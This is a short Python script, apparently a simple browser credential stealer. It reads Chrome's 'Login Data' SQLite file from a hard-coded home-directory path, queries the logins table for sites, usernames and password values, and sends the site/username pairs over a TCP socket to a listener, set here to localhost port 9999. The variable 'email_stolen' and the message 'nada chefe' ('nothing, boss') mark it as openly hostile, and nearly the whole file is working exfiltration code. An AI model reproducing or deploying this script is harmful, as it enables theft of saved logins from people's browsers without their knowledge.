import socket
import sqlite3

class SocketConfig:

    def __init__(self, HOST:str, PORT:int) -> None:

        self.HOST = HOST
        self.PORT =  PORT

    def connect(self) -> socket:
        try:
            skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            skt.connect((self.HOST, self.PORT))
            return skt
        except Exception as e:
            print(f'Check connect(): {e}')

    def send_data(self, skt_client: socket, email_stolen: list) -> None:

        if skt_client:
            try:

                if not email_stolen:
                    skt_client.sendall("nada chefe".encode())
                else:
                    for item in email_stolen:
                        skt_client.sendall(item.encode())
            except Exception as e:
                print(f'Check send_data(): {e}')
        
class DatabaseConfig:
    
    def __init__(self, login_data_path: str) -> None:

        self.login_data_path = login_data_path
        
    def database_connect(self) -> sqlite3.Connection:

        try:
            sqliteConnection = sqlite3.connect(self.login_data_path)
            return sqliteConnection
        except Exception as e:
            print(f'Check database_connect(): {e}')

    def extract_data(self, sqliteConnection: sqlite3.Connection) -> list:

        try:
            sql_query = "SELECT origin_url,username_value,password_value FROM logins;"
            cursor = sqliteConnection.cursor()
            cursor.execute(sql_query)
            result_query = cursor.fetchall()

            list_users = []
            for data in result_query:
                if data[1] == '':
                    continue
                usermail = f"\nHost: {data[0]}\nUser: {data[1]}" 
                list_users.append(usermail)
            return list_users

        except Exception as e:
            print(f'Check extract_data(): {e}')
            
        finally:
            if sqliteConnection:
                cursor.close()
                sqliteConnection.close()
                
if __name__ == "__main__":

    login_data_path = r"/home/s1x/.config/google-chrome/Default/Login Data"
    
    client = SocketConfig('localhost', 9999)
    database = DatabaseConfig(login_data_path)

    databaseConnection = database.database_connect()
    dataBaseEmails = database.extract_data(databaseConnection)

    client.send_data(client.connect(), dataBaseEmails)